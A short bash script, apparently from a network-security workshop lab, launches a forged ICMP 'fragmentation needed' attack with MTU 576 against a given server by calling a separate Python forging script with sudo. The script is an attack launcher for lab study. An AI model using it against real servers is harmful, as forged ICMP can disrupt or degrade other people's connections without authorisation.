#!/usr/bin/env bash
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=../lib/common.sh
source "${DIR}/../lib/common.sh"

SERVER="${1:-}"
SPORT=45678
DPORT=8080
SEQ=1
MTU=576

if [[ -z "${SERVER}" ]]; then
  echo "Uso: sudo ./atacante.sh <IP_SERVIDOR>"
  exit 1
fi

echo "=== Punto 08 LAN — ICMP MTU forjado ==="
curl -s --max-time 3 "http://${SERVER}:${DPORT}/" && echo "" || echo "[!] Servidor no responde aún"
exec sudo python3 "${TALLER_ROOT}/punto-08-icmp-off-path/vulnerable/scripts/forge_icmp_mtu.py" \
  "${SERVER}" "${SERVER}" "${SERVER}" "${SPORT}" "${DPORT}" "${SEQ}" "${MTU}"
